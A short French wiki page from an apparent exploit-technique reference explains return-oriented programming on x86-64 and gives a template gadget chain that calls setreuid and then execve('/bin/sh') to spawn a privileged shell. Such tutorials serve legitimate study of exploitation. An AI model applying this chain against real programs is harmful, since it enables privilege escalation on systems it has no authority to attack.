---
layout: default
title: Hexwreaker Expoitpedia
---
#### [ExploitPedia](/pages/exploitpedia/exploitpedia)

# ROP-x86-64

    Cible : x86 64bit

## Présentation

La technique du ROP sur une architecture x86 64 bits est la même que sur 32 bits. Il faut s'appuyer sur des gadgets afin d'exécuter certaines fonction de la libc ou encore des appels systèmes.

Parfois la zone mémoire contrôlée par l'attaquant n'est pas suffisante, c'est pourquoi il peut être utile de "pivoter" dans la pile.

L'exploitation consiste à écrire notre chaîne "ROP" après le buffer, à partir de l'adresse de retour de la fonction main dans la pile. 

La chaîne ROP va effectuer 2 appels systèmes :

1. setreuid(target_uid, target_uid);
2. execve("/bin/sh", 0, 0);

Voici la chaîne ROP qui s'appuie sur des gadgets présent dans le code :

```c
pop_rdi_ret
0xtarget_uid
pop_rsi_ret
0xtarget_uid
pop_rax_ret
0x71
syscall_ret
pop_rsi_ret
@bss
pop_rax_ret
b"/bin/sh\x00"
mov_prsi_rax_ret
pop_rdi_ret
@bss
pop_rsi_ret
0x0
pop_rdx_ret
0x0
pop_rax_ret
0x3b
syscall
```
